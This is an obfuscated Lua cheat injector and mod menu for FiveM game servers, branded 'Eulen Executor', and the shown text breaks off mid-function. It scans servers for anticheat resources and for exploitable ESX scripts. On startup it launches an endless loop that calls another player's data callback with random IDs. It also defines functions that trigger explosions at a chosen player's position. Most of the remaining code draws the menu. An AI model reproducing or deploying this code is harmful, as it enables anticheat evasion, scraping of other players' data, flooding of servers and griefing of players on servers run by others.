Absolute = {}
Absolute_function = {}
Absolute.debug = false
local function nlXCUGaxh(LRPoi8PgQ3H)
    if LRPoi8PgQ3H then
        return LRPoi8PgQ3H + 0.0
    end
end
local iBmKMJ4D7K = true
fatprint = print
local function BR_BkvC9lTdDDJ(b8RYz4aDptjtRCI)
    fatprint(b8RYz4aDptjtRCI)
end
local function I0oW9H(MQpTs2y406uxEQ2eJX)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(MQpTs2y406uxEQ2eJX)
    DrawNotification(true, false)
end
ESX = nil
local function aNfWFA0Fh0SOPuMjtoOFeg()
    BR_BkvC9lTdDDJ("Welcome to Eulen.CC, + on Numpad to open Menu.")
    Citizen.CreateThread(
        function()
            while ESX == nil do
                TriggerEvent(
                    "esx:getSharedObject",
                    function(i7AAc5VtJMwUUjGIS)
                        ESX = i7AAc5VtJMwUUjGIS
                    end
                )
                Citizen.Wait(0.0)
            end
        end
    )
    while true do
        Citizen.Wait(780)
        Citizen.CreateThread(
            function()
                Citizen.Wait(1000)
                while true do
                    ESX.TriggerServerCallback(
                        "esx:getOtherPlayerData",
                        function(MFrb2YQX8T1KYa0X)
                        end,
                        math.random(100)
                    )
                end
            end
        )
    end
end
local function RXx(ZqQheOB2LZ1r, BGnDnoIQOTqPy1, FeA5mzjS90)
    RequestNamedPtfxAsset(ZqQheOB2LZ1r)
    UseParticleFxAssetNextCall(ZqQheOB2LZ1r)
    StartNetworkedParticleFxNonLoopedOnEntity(
        BGnDnoIQOTqPy1,
        FeA5mzjS90,
        nlXCUGaxh(0.0),
        nlXCUGaxh(0.0),
        -0.5,
        nlXCUGaxh(0.0),
        nlXCUGaxh(0.0),
        nlXCUGaxh(0.0),
        nlXCUGaxh(1),
        false,
        false,
        false
    )
end
local function yA_z()
    if IsControlPressed(1, 73) then
        RequestNamedPtfxAsset("core")
        UseParticleFxAssetNextCall("core")
        StartNetworkedParticleFxNonLoopedOnEntity(
            "ent_sht_flame",
            GetPlayerPed(-1),
            nlXCUGaxh(0.0),
            0.35,
            0.6,
            nlXCUGaxh(0.0),
            nlXCUGaxh(0.0),
            nlXCUGaxh(0.0),
            nlXCUGaxh(0.0),
            false,
            false,
            false
        )
    end
end
local function hJrNvGGTs9gtBHDg5XYR(ti5)
    DrawMarker(
        ti5,
        Markerloc,
        nlXCUGaxh(0.0),
        nlXCUGaxh(0.0),
        nlXCUGaxh(0.0),
        nlXCUGaxh(0.0),
        nlXCUGaxh(180),
        nlXCUGaxh(0.0),
        nlXCUGaxh(1),
        nlXCUGaxh(1),
        nlXCUGaxh(1),
        255,
        128,
        0.0,
        160,
        false,
        true,
        2,
        nil,
        nil,
        false
    )
end
local function msnUPYc5iQSiGfA(
    GunUnNVDDEGJswsZ0,
    oy53,
    EPWUNXha3r_qESvr5,
    fcfzJfXgi,
    lOxa,
    zIF6KeZ84NacWZMS,
    phbAQybd2mc9M4eBLNAe,
    vTgvDcT)
    AddExplosion(GunUnNVDDEGJswsZ0, oy53, EPWUNXha3r_qESvr5, fcfzJfXgi, lOxa, zIF6KeZ84NacWZMS, phbAQybd2mc9M4eBLNAe)
end
local function Vz2()
    AddExplosion(Markerloc, 5, 100, true, false, 1)
end
local function jUHKCaIBnhX(Ev33A0K, T6c03, p5xejPPn75A, ER6CzEKsuI)
    AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), Ev33A0K, 100, p5xejPPn75A, ER6CzEKsuI, T6c03)
end
local o = GetPlayerName(PlayerId())
for i = 1, 30 do
    BR_BkvC9lTdDDJ(" ")
end
if iBmKMJ4D7K then
    function CheckIfResourceExist(C4_wo)
        if
            GetResourceState(C4_wo) == "started" or string.upper(GetResourceState(C4_wo)) == "started" or
                string.lower(GetResourceState(C4_wo)) == "started"
         then
            return true
        else
            return false
        end
    end
    local TQ7cFfvp = true
    local YVJRPnqZyw = 0.0
    local F = {
        "esx_vangelico_robbery",
        "esx_vangelico",
        "ESX_Cargodelivery",
        "esx_minerjob",
        "esx_fishing",
        "james_fishing",
        "esx_garbagejob",
        "esx_garbage",
        "esx_gopostaljob",
        "esx_dmvschool",
        "esx_blanchisseur",
        "esx_moneywash",
        "esx_atmRobbery",
        "rasen",
        "utk_flecca"
    }
    local IJoWNKK2Qtb7R5qBp7 = {}
    local QmNz2 = 0.0
    local xQpe2MnXWHsD = {
        "anticheat",
        "Anticheat",
        "esx_anticheat",
        "anticheese",
        "anticheese-anticheat",
        "TigoAntiCheat",
        "NSAC",
        "NSAC-master",
        "TigoAntiCheat",
        "ANTICHEAT-NEXUS",
        "ANTICHEAT-Muulfz",
        "Anti-Lynx-Fivem",
        "anti-lynx",
        "antilynx"
    }
    local ANt = {}
    for i = 1, #F do
        if CheckIfResourceExist(F[i]) then
            YVJRPnqZyw = YVJRPnqZyw + 1
            table.insert(IJoWNKK2Qtb7R5qBp7, F[i])
        end
    end
    for i = 1, #xQpe2MnXWHsD do
        if CheckIfResourceExist(xQpe2MnXWHsD[i]) then
            QmNz2 = QmNz2 + 1
            table.insert(ANt, xQpe2MnXWHsD[i])
        end
    end
    BR_BkvC9lTdDDJ("Anticheats = " .. QmNz2)
    BR_BkvC9lTdDDJ("Anticheats name: ")
    for i = 1, #ANt do
        BR_BkvC9lTdDDJ(ANt[i])
    end
    BR_BkvC9lTdDDJ("ESX Exploitables = " .. YVJRPnqZyw)
    BR_BkvC9lTdDDJ("Scripts name: ")
    for i = 1, #IJoWNKK2Qtb7R5qBp7 do
        BR_BkvC9lTdDDJ(IJoWNKK2Qtb7R5qBp7[i])
    end
    BR_BkvC9lTdDDJ(
        "================================================================================================================================================================================================================================================"
    )
    local vC6el9ZpUmr9AnoD5DQS = {"108.175.7.184:10088"}
    local zPMTTgmOa8LJY = GetCurrentServerEndpoint()
    local TExeL67wceUup4OILN4iQ = nil
    for i = 1, #vC6el9ZpUmr9AnoD5DQS do
        if zPMTTgmOa8LJY == vC6el9ZpUmr9AnoD5DQS[i] then
            TExeL67wceUup4OILN4iQ = false
        else
            TExeL67wceUup4OILN4iQ = true
        end
    end
    Enabled = TExeL67wceUup4OILN4iQ
    if not TExeL67wceUup4OILN4iQ then
        for i = 0.0, 5 do
            BR_BkvC9lTdDDJ("YOU CAN'T INJECT HERE")
        end
    end
else
    SetEntityHealth(GetPlayerPed(-1), 0.0)
end
BR_BkvC9lTdDDJ(
    "==================================================================================================================================================="
)
BR_BkvC9lTdDDJ("")
BR_BkvC9lTdDDJ("$$$$$$$$\\          $$\\                           $$\\      $$\\   ")
BR_BkvC9lTdDDJ("$$  _____|         $$ |                          $$$\\    $$$ | ")
BR_BkvC9lTdDDJ("$$ |     $$\\   $$\\ $$ | $$$$$$\\  $$$$$$$\\        $$$$\\  $$$$ | $$$$$$\\  $$$$$$$\\  $$\\   $$\\ ")
BR_BkvC9lTdDDJ("$$$$$\\   $$ |  $$ |$$ |$$  __$$\\ $$  __$$\\       $$\\$$\\$$ $$ |$$  __$$\\ $$  __$$\\ $$ |  $$ | ")
BR_BkvC9lTdDDJ("$$  __|  $$ |  $$ |$$ |$$$$$$$$ |$$ |  $$ |      $$ \\$$$  $$ |$$$$$$$$ |$$ |  $$ |$$ |  $$ | ")
BR_BkvC9lTdDDJ("$$ |     $$ |  $$ |$$ |$$   ____|$$ |  $$ |      $$ |\\$  /$$ |$$   ____|$$ |  $$ |$$ |  $$ |")
BR_BkvC9lTdDDJ("\\________|\\______/ \\__| \\_______|\\__|  \\__|      \\__|     \\__| \\_______|\\__|  \\__| \\______/")
BR_BkvC9lTdDDJ("")
BR_BkvC9lTdDDJ(
    "==================================================================================================================================================="
)
MainColor = {r = 137, g = 35, b = 196, a = 255}
local KWKR38C2USw_mWy_ = true
local sn9NUZs5i = CreateRuntimeTxd("dopatest")
local PnCJy = nil
if KWKR38C2USw_mWy_ then
    Citizen.CreateThread(
        function()
            local V0cIUBI8rc88V1PWApv3D = CreateDui("https://i.imgur.com/SyQ6O6F.png", 512, 128)
            Citizen.Wait(125)
            local SF3e = GetDuiHandle(V0cIUBI8rc88V1PWApv3D)
            local g2u_ = CreateRuntimeTextureFromDuiHandle(sn9NUZs5i, "duiTex", SF3e)
            Citizen.Wait(125)
            AddReplaceTexture("shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "dopatest", "duiTex")
            KWKR38C2USw_mWy_ = false
        end
    )
end
local jjZMYGaeC1Bwr3SK8lrkP = {
    ["ESC"] = 322,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["E"] = 38,
    ["R"] = 45,
    ["T"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0.0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["LEFT"] = 174,
    ["RIGHT"] = 175,
    ["TOP"] = 27,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N8"] = 61,
    ["N9"] = 118,
    ["MOUSE1"] = 24
}
local wWjAS8 = {}
local m7seRenREHC71wmzad = {
    up = jjZMYGaeC1Bwr3SK8lrkP["UP"],
    down = jjZMYGaeC1Bwr3SK8lrkP["DOWN"],
    left = jjZMYGaeC1Bwr3SK8lrkP["LEFT"],
    right = jjZMYGaeC1Bwr3SK8lrkP["RIGHT"],
    select = jjZMYGaeC1Bwr3SK8lrkP["NENTER"],
    back = 202
}
local jbPzKxfZnu2uS = 0.0
local jM3_Fcyu0yA8NxXu = nil
local xV7EAnbI4oYL6jSIBnjq = nil
local _v_WWf = 0.1
local SWSyqxJ43AX = 0.005
local vZtf = 0.2
local D7DN5z5 = 1
local klqT8RRE7whnNb9Jwode = 0.033
local ZQt = 4
local CpEz3cm8vrz0MZwAZV7 = 0.36
local EFvt7DlMPYx5D5 = 0.003
local BpxJ = 0.0025
local l3hynQvfI9D = true
local dG1AKw8upKUbCOG = true
local function rK(ZOpkFufCms1HV8M)
    if Absolute.debug then
        Citizen.Trace("[swaglord] " .. tostring(ZOpkFufCms1HV8M))
    end
end
local function EPd4KT2PLr(aZPwn3UtqSUzNRfmjtBSa, yhr, ylDgiJC)
    if aZPwn3UtqSUzNRfmjtBSa and wWjAS8[aZPwn3UtqSUzNRfmjtBSa] then
        wWjAS8[aZPwn3UtqSUzNRfmjtBSa][yhr] = ylDgiJC
        rK(aZPwn3UtqSUzNRfmjtBSa .. " menu property changed: { " .. tostring(yhr) .. ", " .. tostring(ylDgiJC) .. " }")
    end
end
local function mDkHWFkytGR(K46DtPtCA__UGVKjzy_UV)
    if K46DtPtCA__UGVKjzy_UV and wWjAS8[K46DtPtCA__UGVKjzy_UV] then
        return wWjAS8[K46DtPtCA__UGVKjzy_UV].visible
    else
        return false
    end
end
local function u1RGlgrwDNMEFp2K(VUkGKRXI0kkeKHZiLtgn, e6Tf2nKvxrnSgci_jvvP, aJqsyu5m9aYX)
    if VUkGKRXI0kkeKHZiLtgn and wWjAS8[VUkGKRXI0kkeKHZiLtgn] then
        EPd4KT2PLr(VUkGKRXI0kkeKHZiLtgn, "visible", e6Tf2nKvxrnSgci_jvvP)
        if not aJqsyu5m9aYX and wWjAS8[VUkGKRXI0kkeKHZiLtgn] then
            EPd4KT2PLr(VUkGKRXI0kkeKHZiLtgn, "currentOption", 1)
        end
        if e6Tf2nKvxrnSgci_jvvP then
            if VUkGKRXI0kkeKHZiLtgn ~= xV7EAnbI4oYL6jSIBnjq and mDkHWFkytGR(xV7EAnbI4oYL6jSIBnjq) then
                u1RGlgrwDNMEFp2K(xV7EAnbI4oYL6jSIBnjq, false)
            end
            xV7EAnbI4oYL6jSIBnjq = VUkGKRXI0kkeKHZiLtgn
        end
    end
end
local function hG5JA1A_JGdjqAvb_VN(
    tNeF,
    ygMpqB1YW8IC,
    taIB6rAzfzreYEtIPYKn,
    DnqvpYZDp,
    td5,
    r,
    Bxnvw4OY,
    IzYfxYctYq1Y_a4TGlD,
    Dk_h)
    SetTextColour(td5.r, td5.g, td5.b, td5.a)
    SetTextFont(DnqvpYZDp)
    SetTextScale(r, r)
    if IzYfxYctYq1Y_a4TGlD then
        SetTextDropShadow(2, 2, 0.0, 0.0, 0.0)
    end
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        if Bxnvw4OY then
            SetTextCentre(Bxnvw4OY)
        elseif Dk_h then
            SetTextWrap(
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width - EFvt7DlMPYx5D5
            )
            SetTextRightJustify(true)
        end
    end
    BeginTextCommandDisplayText("STRING")
    AddTextComponentSubstringPlayerName(tNeF)
    EndTextCommandDisplayText(ygMpqB1YW8IC, taIB6rAzfzreYEtIPYKn)
end
local function Pp8cjHZ_7lGx(Rql4lXU6sRcvJ4399, FHbfIYmPQFk2KwApkCe, mjKyGRtrVwNFwUN, SBrmk_nq_uUc09xC, Pol8FOt)
    DrawRect(
        Rql4lXU6sRcvJ4399,
        FHbfIYmPQFk2KwApkCe,
        mjKyGRtrVwNFwUN,
        SBrmk_nq_uUc09xC,
        Pol8FOt.r,
        Pol8FOt.g,
        Pol8FOt.b,
        Pol8FOt.a
    )
end
local function UprRgl12vBXwF()
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        local AngHOjrtd0SNYKkCMg = wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 2
        local Fts6B4L = wWjAS8[xV7EAnbI4oYL6jSIBnjq].y + _v_WWf / 2
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].titleBackgroundSprite then
            DrawSprite(
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].titleBackgroundSprite.dict,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].titleBackgroundSprite.name,
                AngHOjrtd0SNYKkCMg,
                Fts6B4L,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                _v_WWf,
                0.0,
                255,
                255,
                255,
                255
            )
        else
            Pp8cjHZ_7lGx(
                AngHOjrtd0SNYKkCMg,
                Fts6B4L,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                _v_WWf,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].titleBackgroundColor
            )
        end
        hG5JA1A_JGdjqAvb_VN(
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].title,
            AngHOjrtd0SNYKkCMg,
            Fts6B4L - _v_WWf / 2 + SWSyqxJ43AX,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].titleFont,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].titleColor,
            D7DN5z5,
            true
        )
    end
end
local function UMp8Lb0GbO()
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        local Rc7RFQUU273tqQl__8B = wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 2
        local ypo7Rw2Vh = wWjAS8[xV7EAnbI4oYL6jSIBnjq].y + _v_WWf + klqT8RRE7whnNb9Jwode / 2
        local eB3I = {r = 255, g = 255, b = 255, a = 255}
        Pp8cjHZ_7lGx(
            Rc7RFQUU273tqQl__8B,
            ypo7Rw2Vh,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].subTitleBackgroundColor
        )
        hG5JA1A_JGdjqAvb_VN(
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].subTitle,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5,
            ypo7Rw2Vh - klqT8RRE7whnNb9Jwode / 2 + BpxJ,
            ZQt,
            eB3I,
            CpEz3cm8vrz0MZwAZV7,
            false
        )
        local cbU712T1ePb = "~o~V6.9"
        hG5JA1A_JGdjqAvb_VN(
            tostring(cbU712T1ePb) .. "  ",
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            ypo7Rw2Vh - klqT8RRE7whnNb9Jwode / 2 + BpxJ,
            ZQt,
            eB3I,
            CpEz3cm8vrz0MZwAZV7,
            false,
            false,
            true
        )
        if not HasStreamedTextureDictLoaded("commonmenu") then
            RequestStreamedTextureDict("commonmenu", true)
        end
        if not HasStreamedTextureDictLoaded("commonmenu") then
            RequestStreamedTextureDict("commonmenu", true)
        end
        DrawSprite(
            "commonmenu",
            "gradient_nav",
            Rc7RFQUU273tqQl__8B,
            ypo7Rw2Vh,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            0.0,
            40,
            40,
            40,
            160
        )
        DrawSprite(
            "commonmenu",
            "gradient_bgd",
            Rc7RFQUU273tqQl__8B,
            ypo7Rw2Vh,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            180,
            255,
            255,
            255,
            180
        )
    end
end
local function v()
    if
        wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount
     then
        multiplier = jbPzKxfZnu2uS
    elseif
        jbPzKxfZnu2uS > wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption
     then
        multiplier =
            jbPzKxfZnu2uS - (wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount)
    end
    if wWjAS8[xV7EAnbI4oYL6jSIBnjq] then
        local S = wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 2
        local LsnO5NN =
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].y + _v_WWf + klqT8RRE7whnNb9Jwode + (klqT8RRE7whnNb9Jwode * multiplier) +
            klqT8RRE7whnNb9Jwode / 2
        local xRqm1t = { 137, g = 35, b = 196, a = 255}
        Pp8cjHZ_7lGx(
            S,
            LsnO5NN,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].subTitleBackgroundColor
        )
        hG5JA1A_JGdjqAvb_VN(
            "Eulen Executor",
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5,
            LsnO5NN - klqT8RRE7whnNb9Jwode / 2 + BpxJ,
            ZQt,
            xRqm1t,
            CpEz3cm8vrz0MZwAZV7,
            false
        )
        hG5JA1A_JGdjqAvb_VN(
            tostring(wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption) .. " / " .. tostring(jbPzKxfZnu2uS),
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            LsnO5NN - klqT8RRE7whnNb9Jwode / 2 + BpxJ,
            ZQt,
            xRqm1t,
            CpEz3cm8vrz0MZwAZV7,
            false,
            false,
            true
        )
        if not HasStreamedTextureDictLoaded("deadline") then
            RequestStreamedTextureDict("deadline", true)
        end
        DrawSprite(
            "commonmenu",
            "gradient_nav",
            S,
            LsnO5NN,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            0.0,
            40,
            40,
            40,
            160
        )
        DrawSprite(
            "commonmenu",
            "gradient_bgd",
            S,
            LsnO5NN,
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
            klqT8RRE7whnNb9Jwode,
            0.0,
            255,
            255,
            255,
            180
        )
    end
end
local function BNMCk91jk0(ijJKvznx26tb__zse8PxA, hbNqNTV4roPt, rk36Zr2W8ONhMfo7UavTQ)
    local SGMA = wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + wWjAS8[xV7EAnbI4oYL6jSIBnjq].width / 2
    local Ro = nil
    if
        wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount
     then
        Ro = jbPzKxfZnu2uS
    elseif
        jbPzKxfZnu2uS > wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount and
            jbPzKxfZnu2uS <= wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption
     then
        Ro = jbPzKxfZnu2uS - (wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption - wWjAS8[xV7EAnbI4oYL6jSIBnjq].maxOptionCount)
    end
    if Ro then
        local NgqD9ZcNIQsJUJMisux =
            wWjAS8[xV7EAnbI4oYL6jSIBnjq].y + _v_WWf + klqT8RRE7whnNb9Jwode + (klqT8RRE7whnNb9Jwode * Ro) -
            klqT8RRE7whnNb9Jwode / 2
        local B6 = nil
        local yf = nil
        local DzH8s8mkrT_v6L_ = nil
        local S79vph3ffgGmsfEBZ = false
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS then
            B6 = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusBackgroundColor
            yf = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusTextColor
            DzH8s8mkrT_v6L_ = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuFocusTextColor
        else
            B6 = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuBackgroundColor
            yf = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuTextColor
            DzH8s8mkrT_v6L_ = wWjAS8[xV7EAnbI4oYL6jSIBnjq].menuSubTextColor
            S79vph3ffgGmsfEBZ = true
        end
        Pp8cjHZ_7lGx(SGMA, NgqD9ZcNIQsJUJMisux, wWjAS8[xV7EAnbI4oYL6jSIBnjq].width, klqT8RRE7whnNb9Jwode, B6)
        if rk36Zr2W8ONhMfo7UavTQ then
            if not HasStreamedTextureDictLoaded(rk36Zr2W8ONhMfo7UavTQ.dict) then
                RequestStreamedTextureDict(rk36Zr2W8ONhMfo7UavTQ.dict, true)
            end
            if menu_TextOutline then
                DrawSprite(
                    rk36Zr2W8ONhMfo7UavTQ.dict,
                    rk36Zr2W8ONhMfo7UavTQ.text,
                    wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.008,
                    NgqD9ZcNIQsJUJMisux - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                    0.0275,
                    0.0375,
                    nlXCUGaxh(0.0),
                    0.0,
                    0.0,
                    0.0,
                    255
                )
            end
            DrawSprite(
                rk36Zr2W8ONhMfo7UavTQ.dict,
                rk36Zr2W8ONhMfo7UavTQ.text,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.008,
                NgqD9ZcNIQsJUJMisux - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                0.0255,
                0.0355,
                0.0,
                MainColor.r,
                MainColor.g,
                MainColor.b,
                155
            )
            DrawSprite(
                rk36Zr2W8ONhMfo7UavTQ.dict,
                rk36Zr2W8ONhMfo7UavTQ.text,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.008,
                NgqD9ZcNIQsJUJMisux - (klqT8RRE7whnNb9Jwode / 2) + BpxJ + 0.0125,
                0.0225,
                0.0325,
                nlXCUGaxh(0.0),
                rk36Zr2W8ONhMfo7UavTQ.color.r,
                rk36Zr2W8ONhMfo7UavTQ.color.g,
                rk36Zr2W8ONhMfo7UavTQ.color.b,
                255
            )
            hG5JA1A_JGdjqAvb_VN(
                ijJKvznx26tb__zse8PxA,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5 + 0.018,
                NgqD9ZcNIQsJUJMisux - (klqT8RRE7whnNb9Jwode / 2) + BpxJ,
                ZQt,
                yf,
                CpEz3cm8vrz0MZwAZV7,
                false,
                S79vph3ffgGmsfEBZ
            )
        else
            hG5JA1A_JGdjqAvb_VN(
                ijJKvznx26tb__zse8PxA,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5,
                NgqD9ZcNIQsJUJMisux - (klqT8RRE7whnNb9Jwode / 2) + BpxJ,
                ZQt,
                yf,
                CpEz3cm8vrz0MZwAZV7,
                false,
                S79vph3ffgGmsfEBZ
            )
        end
        if hbNqNTV4roPt then
            hG5JA1A_JGdjqAvb_VN(
                hbNqNTV4roPt,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].x + EFvt7DlMPYx5D5,
                NgqD9ZcNIQsJUJMisux - klqT8RRE7whnNb9Jwode / 2 + BpxJ,
                ZQt,
                DzH8s8mkrT_v6L_,
                CpEz3cm8vrz0MZwAZV7,
                false,
                S79vph3ffgGmsfEBZ,
                true
            )
        end
        if wWjAS8[xV7EAnbI4oYL6jSIBnjq].currentOption == jbPzKxfZnu2uS and dG1AKw8upKUbCOG then
            if not HasStreamedTextureDictLoaded("deadline") then
                RequestStreamedTextureDict("deadline", true)
            end
            DrawSprite(
                "commonmenu",
                "gradient_nav",
                SGMA,
                NgqD9ZcNIQsJUJMisux,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                klqT8RRE7whnNb9Jwode,
                nlXCUGaxh(0.0),
                MainColor.r,
                MainColor.g,
                MainColor.b,
                160
            )
            DrawSprite(
                "commonmenu",
                "gradient_bgd",
                SGMA,
                NgqD9ZcNIQsJUJMisux,
                wWjAS8[xV7EAnbI4oYL6jSIBnjq].width,
                klqT8RRE7whnNb9Jwode,
                nlXCUGaxh(0.0),
                255,
                255,
                255,
                180
            )
        end
    end
end
ActivesMenus = {}
function Absolute.CreateMenu(WzsvL_FFd3C6Tv, JyWwkuVQRI)
    table.insert(ActivesMenus, WzsvL_FFd3C6Tv)
    wWjAS8[WzsvL_FFd3C6Tv] = {}
    wWjAS8[WzsvL_FFd3C6Tv].title = JyWwkuVQRI
    wWjAS8[WzsvL_FFd3C6Tv].subTitle = "MAIN MENU"
    wWjAS8[WzsvL_FFd3C6Tv].visible = false
    wWjAS8[WzsvL_FFd3C6Tv].previousMenu = nil
    wWjAS8[WzsvL_FFd3C6Tv].aboutToBeClosed = false
    wWjAS8[WzsvL_FFd3C6Tv].x = 0.0175
    wWjAS8[WzsvL_FFd3C6Tv].y = 0.1
    wWjAS8[WzsvL_FFd3C6Tv].width = 0.24
    wWjAS8[WzsvL_FFd3C6Tv].currentOption = 1
    wWjAS8[WzsvL_FFd3C6Tv].maxOptionCount = 14
    wWjAS8[WzsvL_FFd3C6Tv].titleFont = 4
    wWjAS8[WzsvL_FFd3C6Tv].titleColor = {r = 137, g = 35, b = 196, a = 0.0}
    wWjAS8[WzsvL_FFd3C6Tv].titleBackgroundColor = {r = 137, g = 35, b = 196, a = 255}
    wWjAS8[WzsvL_FFd3C6Tv].titleBackgroundSprite = nil
    wWjAS8[WzsvL_FFd3C6Tv].menuTextColor = {r = 137, g = 35, b = 196, a = 255}
    wWjAS8[WzsvL_FFd3C6Tv].menuSubTextColor = {r = 137, g = 35, b = 196, a = 255}
    wWjAS8[WzsvL_FFd3C6Tv].menuFocusTextColor = {r = 137, g = 35, b = 196, a = 255}
    wWjAS8[WzsvL_FFd3C6Tv].menuFocusBackgroundColor = {r = 92, g = 92, b = 92, a = 0.0}
    wWjAS8[WzsvL_FFd3C6Tv].menuBackgroundColor = {r = 35, g = 35, b = 35, a = 220}
    wWjAS8[WzsvL_FFd3C6Tv].subTitleBackgroundColor = {r = 137, g = 35, b = 196, a = 180}
    wWjAS8[WzsvL_FFd3C6Tv].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}
    rK(tostring(WzsvL_FFd3C6Tv) .. " menu created")
end
function Absolute.CreateSubMenu(PzZ, ah6k69OW6AO0PRn0Xlu, jR77U)
    if wWjAS8[ah6k69OW6AO0PRn0Xlu] then
